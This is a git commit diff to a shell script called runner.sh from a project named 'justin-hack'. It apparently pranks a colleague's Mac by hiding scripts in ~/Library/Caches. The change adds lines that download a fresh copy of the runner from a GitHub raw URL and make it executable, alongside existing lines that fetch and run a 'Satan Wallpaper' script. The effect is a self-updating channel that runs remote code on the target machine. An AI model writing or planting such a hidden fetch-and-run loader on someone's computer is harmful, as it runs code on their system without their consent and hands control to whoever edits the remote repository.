7284e4155666d1c2f9ba054ebf5f11b3e5d4bcae
Frédéric MARTINEZ <frederic.martinez@ph2m.com>
2019-04-01 23:35:17 +0200

    🕺 Happy Runner

--- runner.sh
+++ runner.sh
@@ -4,9 +4,13 @@
 jh=~/Library/Caches/jh
 baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master
 
+# Update Runner
+curl -o $jh/runner.sh $baseurl/runner.sh
+chmod +x $jh/runner.sh
+
 # Get Satan Wallpaper
 curl -o $jh/wallpaper.sh $baseurl/wallpaper.sh
 chmod +x $jh/wallpaper.sh
 
 # Run Satan Wallpaper
-sh $jh/wallpaper.sh justin_default
+$jh/wallpaper.sh justin_default
